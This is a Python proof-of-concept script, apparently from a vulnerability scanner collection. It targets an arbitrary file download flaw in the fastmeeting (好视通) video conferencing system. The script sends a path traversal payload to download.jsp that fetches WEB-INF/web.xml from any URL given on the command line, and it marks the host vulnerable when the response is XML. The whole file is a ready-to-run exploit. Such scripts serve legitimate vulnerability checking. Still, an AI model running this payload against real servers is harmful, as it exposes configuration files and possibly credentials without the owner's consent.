#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 好视通视频会议系统(fastmeeting)任意文件遍历
referer: http://www.wooyun.org/bugs/wooyun-2010-0143719
author: Lucifer
description: 文件/dbbackup/adminMgr/download.jsp中,参数fileName存在任意文件下载。
'''
import sys
import requests
import warnings
def run(url):
        result = ['好视通视频会议系统(fastmeeting)任意文件遍历', '', '']

        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/dbbackup/adminMgr/download.jsp?fileName=../WEB-INF/web.xml"
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if req.headers["Content-Type"] == "application/xml":
                result[2]=  '存在'
                result[1] = vulnurl
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
